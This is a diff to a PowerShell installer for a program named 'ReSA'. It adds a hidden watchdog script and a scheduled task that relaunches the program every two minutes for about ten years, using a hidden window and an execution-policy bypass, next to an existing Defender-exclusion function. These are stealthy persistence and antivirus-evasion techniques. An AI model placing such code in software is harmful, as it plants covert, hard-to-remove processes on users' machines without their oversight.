@@ -113,6 +113,37 @@ function Add-DefenderExclusion {
     return $ok
 }
 
+function Register-WatchdogTask {
+    param(
+        [string]$TaskName,
+        [string]$ProcessName,
+        [string]$Exe,
+        [string]$Dir,
+        [string]$UpdateMarker
+    )
+
+    $watchFile = Join-Path $Dir "watchdog.ps1"
+    $watchLines = @(
+        '$ErrorActionPreference = "SilentlyContinue"'
+        ('$Exe = "' + ($Exe.Replace('"', '`"')) + '"')
+        ('$Dir = "' + ($Dir.Replace('"', '`"')) + '"')
+        ('$Name = "' + $ProcessName + '"')
+        ('$Marker = "' + ($UpdateMarker.Replace('"', '`"')) + '"')
+        'if ((Test-Path -LiteralPath $Marker)) { exit 0 }'
+        'if (-not (Get-Process -Name $Name -ErrorAction SilentlyContinue)) {'
+        '    Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden'
+        '}'
+    )
+    Set-Content -LiteralPath $watchFile -Value $watchLines -Encoding UTF8
+    Unblock-File -LiteralPath $watchFile -ErrorAction SilentlyContinue
+
+    $taskArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchFile`""
+    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $taskArgs -WorkingDirectory $Dir
+    $Trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1)) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Days 3650)
+    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -MultipleInstances IgnoreNew
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
+}
+
 Write-InstallLog "install start"
 Write-InstallLog ("target: " + $Exe)
 
@@ -189,6 +220,13 @@ if (-not $startupOk) {
     $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
     Register-ScheduledTask -TaskName "ReSA" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
     Write-InstallLog "scheduled task ok"
+}
+
+try {
+    Register-WatchdogTask -TaskName "ReSA-Watchdog" -ProcessName "ReSA" -Exe $Exe -Dir $Dir -UpdateMarker (Join-Path $Dir "ReSA.new.exe")
+    Write-InstallLog "watchdog task ok"
+} catch {
+    Write-InstallLog ("watchdog task skipped: " + $_.Exception.Message)
 }
 
 try {
